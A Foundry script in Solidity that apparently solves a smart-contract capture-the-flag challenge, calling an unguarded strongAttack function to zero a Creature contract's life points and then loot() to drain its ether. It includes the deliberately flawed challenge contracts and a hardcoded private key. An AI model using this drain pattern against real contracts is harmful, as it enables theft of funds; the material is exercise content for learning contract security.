// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {Script, console} from "forge-std/Script.sol";

contract Solution is Script {
    Setup public setup = Setup(0x9f151fcabED067B15606dc50Dda1bDf063D85155);
    address wallet = 0xcD2c69D05806193270B214CfC5E84D26890b0bB0;
    Creature public target = setup.TARGET();

    function setUp() public {}

    function run() public {
        vm.startBroadcast(0x0e297b9552ac89ffd75a1f047290e33e768189494129e44bc4dcd1896f8188ff);

        target.strongAttack(20);
        target.loot();
        console.log(setup.isSolved());

        vm.stopBroadcast();
    }
}

// "PrivateKey": "0x0e297b9552ac89ffd75a1f047290e33e768189494129e44bc4dcd1896f8188ff",
//     "Address": "0xcD2c69D05806193270B214CfC5E84D26890b0bB0",
//     "TargetAddress": "0x949fcfB1544E21feDD7b555C918E0CE64C24bf37",
//     "setupAddress": "0x9f151fcabED067B15606dc50Dda1bDf063D85155"


contract Setup {
    Creature public immutable TARGET;

    constructor() payable {
        require(msg.value == 1 ether);
        TARGET = new Creature{value: 10}();
    }

    function isSolved() public view returns (bool) {
        return address(TARGET).balance == 0;
    }
}

contract Creature {
    
    uint256 public lifePoints;
    address public aggro;

    constructor() payable {
        lifePoints = 20;
    }

    function strongAttack(uint256 _damage) external{
        _dealDamage(_damage);
    }
    
    function punch() external {
        _dealDamage(1);
    }

    function loot() external {
        require(lifePoints == 0, "Creature is still alive!");
        payable(msg.sender).transfer(address(this).balance);
    }

    function _dealDamage(uint256 _damage) internal {
        aggro = msg.sender;
        lifePoints -= _damage;
    }
}